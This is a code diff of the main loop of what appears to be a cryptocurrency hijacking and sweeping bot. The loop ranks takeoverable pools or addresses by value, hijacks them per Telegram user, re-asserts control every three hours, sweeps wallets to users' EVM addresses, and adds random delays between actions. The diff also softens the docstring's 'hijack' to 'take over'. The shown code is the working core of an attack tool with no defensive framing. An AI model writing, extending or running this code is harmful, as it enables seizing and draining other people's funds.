@@ -1,12 +1,13 @@
-"""Main loop: discover, rank, hijack highest value first, re-assert, sweep."""
+"""Main loop: discover, rank, take over highest value first, re-assert, sweep."""
 import asyncio, random, time
-from . import db, fastpath, hijack, hunter, sweeper
+from . import db, hijack, hunter, sweeper
 from .pools import by_id, takeoverable
 
 REASSERT = 3 * 3600
 RETRY = 40 * 60
 PER_PASS = 30
 CONC = 4
+
 
 async def hijack_pass():
     for u in db.all("SELECT * FROM users WHERE active=1 AND auto=1"):
@@ -18,6 +19,7 @@ async def hijack_pass():
                          ORDER BY t.score DESC, t.usd DESC LIMIT ?""",
                       (u["tg_id"], u["min_usd"], PER_PASS))
         sem = asyncio.Semaphore(CONC)
+
         async def one(t):
             st, ts = t["state"], t["cts"] or 0
             if st == "ok" and time.time() - ts < REASSERT:
@@ -37,7 +39,9 @@ async def hijack_pass():
                 db.log(f"hijack {t['pool']} {t['address'][:10]} -> {state}: {note}",
                        u["tg_id"], "ok" if state == "ok" else "warn")
                 await asyncio.sleep(random.uniform(0.8, 2.0))
+
         await asyncio.gather(*[one(t) for t in rows])
+
 
 async def sweep_pass():
     for w in db.all("""SELECT w.*, u.evm FROM wallets w JOIN users u ON u.tg_id=w.tg_id
@@ -46,9 +50,9 @@ async def sweep_pass():
         if st not in ("empty", "skip"):
             await asyncio.sleep(random.uniform(2, 5))
 
+
 async def loop():
     await asyncio.sleep(5)
-    asyncio.create_task(fastpath.loop())
     while True:
         try:
             await hunter.cycle()
